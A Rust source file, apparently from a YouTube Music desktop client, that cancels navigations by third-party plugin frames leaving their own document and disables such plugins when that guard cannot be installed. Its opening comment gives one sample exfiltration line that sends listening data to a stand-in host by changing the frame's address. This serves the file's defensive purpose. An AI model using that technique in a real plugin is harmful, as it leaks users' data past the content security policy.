//! Keeps the frames of external plugins on their own document.
//!
//! A plugin's frame may not contact the network, which its content security
//! policy sees to. That policy cannot stop the frame from going to another
//! address, though, and an address can carry data: `location.href =
//! "https://example.com/?" + whatIsPlaying`. So the browser is told to cancel
//! every navigation of such a frame that leads away from the plugin's document.
//! Where that cannot be set up, plugins from others do not run at all.

use std::sync::atomic::{AtomicBool, Ordering};
use tauri::{Manager, Url, WebviewWindow};

/// Whether plugins from others may run: only once the browser keeps their
/// frames on their own document. Their files are not served before.
#[derive(Default)]
pub struct FrameGuard(AtomicBool);

impl FrameGuard {
    pub fn active(&self) -> bool {
        self.0.load(Ordering::Acquire)
    }

    fn set(&self, active: bool) {
        self.0.store(active, Ordering::Release);
    }

    /// Switches plugins from others off; true if they were on until now.
    #[cfg(any(windows, test))]
    fn turn_off(&self) -> bool {
        self.0.swap(false, Ordering::AcqRel)
    }
}

/// Watches the frames of the main window, then opens `start` in it. The
/// window starts empty, so that no plugin frame exists before the watch.
#[cfg(windows)]
pub fn watch(window: &WebviewWindow, start: Url) {
    use crate::plugins::{frame_navigation, FrameNavigation};
    use std::sync::{Arc, Mutex};
    use webview2_com::{
        take_pwstr, FrameCreatedEventHandler, FrameNavigationStartingEventHandler,
        Microsoft::Web::WebView2::Win32::{ICoreWebView2Frame2, ICoreWebView2_4},
    };
    use windows_core::{Interface, PWSTR};

    let page = window.clone();
    let result = window.with_webview(move |webview| {
        let unguarded = page.clone();
        let on_frame = FrameCreatedEventHandler::create(Box::new(move |_webview, args| {
            let Some(args) = args else {
                return Ok(());
            };
            let watched = (|| -> windows_core::Result<()> {
                // SAFETY: a COM call on the arguments of a live event, on the thread that raised it.
                let frame = unsafe { args.Frame()? }.cast::<ICoreWebView2Frame2>()?;
                // The plugin document this frame first loaded, once it has loaded one.
                let home: Arc<Mutex<Option<String>>> = Arc::default();
                let on_navigation =
                    FrameNavigationStartingEventHandler::create(Box::new(move |_frame, args| {
                        let Some(args) = args else {
                            return Ok(());
                        };
                        let allowed = (|| -> windows_core::Result<bool> {
                            let mut uri = PWSTR::null();
                            // SAFETY: a COM call with a valid place for the result; the
                            // string it allocates is freed by `take_pwstr`.
                            let uri = unsafe {
                                args.Uri(&mut uri)?;
                                take_pwstr(uri)
                            };
                            let mut home = home.lock().unwrap_or_else(|err| err.into_inner());
                            Ok(match frame_navigation(home.as_deref(), &uri) {
                                FrameNavigation::Allow => true,
                                FrameNavigation::Adopt => {
                                    *home = Some(uri);
                                    true
                                }
                                FrameNavigation::Cancel => {
                                    log_error!(
                                        "a plugin's frame tried to leave its document; cancelled"
                                    );
                                    false
                                }
                            })
                        })()
                        // What cannot be checked does not go ahead.
                        .unwrap_or_else(|err| {
                            log_error!("cannot check where a frame goes, cancelled: {err}");
                            false
                        });
                        if !allowed {
                            // SAFETY: a COM call on the arguments of a live event.
                            unsafe { args.SetCancel(true)? };
                        }
                        Ok(())
                    }));
                let mut token = 0i64;
                // SAFETY: a COM call on a live frame, on the thread that owns it.
                unsafe { frame.add_NavigationStarting(&on_navigation, &mut token) }
            })();
            if let Err(err) = watched {
                // A frame without a watch may be a plugin's: no more plugins
                // from others, and the page loads again without them. Only
                // the first time: the page's own frames come back with it, and
                // a watch that fails for them would reload it again and again.
                if unguarded.state::<FrameGuard>().turn_off() {
                    log_error!("cannot watch a frame, plugins from others are switched off: {err}");
                    let _ = unguarded.reload();
                }
            }
            Ok(())
        }));
        let mut token = 0i64;
        // SAFETY: COM calls on the controller of a live webview, made on the
        // thread that owns it, which is where `with_webview` runs this.
        let registered = unsafe {
            webview
                .controller()
                .CoreWebView2()
                .and_then(|core| core.cast::<ICoreWebView2_4>())
                .and_then(|core| core.add_FrameCreated(&on_frame, &mut token))
        };
        match registered {
            Ok(()) => page.state::<FrameGuard>().set(true),
            Err(err) => log_error!(
                "cannot watch the frames of plugins, plugins from others are switched off: {err}"
            ),
        }
    });
    if let Err(err) = result {
        log_error!("cannot reach the webview, plugins from others are switched off: {err}");
    }
    // Queued after the watch, so the page comes when the guard is in place.
    #[cfg(debug_assertions)]
    crate::dev_inject::start(window, start.as_str());
    #[cfg(not(debug_assertions))]
    if let Err(err) = window.navigate(start) {
        log_error!("cannot open YouTube Music: {err}");
    }
}

/// WebKitGTK asks the window's navigation handler about the navigations of
/// frames as well, and that handler lets nothing go to a page outside the app,
/// see `window::in_window`. The page was opened when the window was made.
#[cfg(target_os = "linux")]
pub fn watch(window: &WebviewWindow, _start: Url) {
    window.state::<FrameGuard>().set(true);
}

/// Nothing here keeps a frame on its document: plugins from others stay off.
#[cfg(not(any(windows, target_os = "linux")))]
pub fn watch(_window: &WebviewWindow, _start: Url) {}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plugins_from_others_are_off_until_the_guard_is_set() {
        let guard = FrameGuard::default();
        assert!(!guard.active());
        guard.set(true);
        assert!(guard.active());
        guard.set(false);
        assert!(!guard.active());
    }

    #[test]
    fn turning_off_tells_whether_it_was_on() {
        let guard = FrameGuard::default();
        guard.set(true);
        assert!(guard.turn_off());
        // Already off: nothing to do, the page is not loaded again.
        assert!(!guard.turn_off());
        assert!(!guard.active());
    }
}
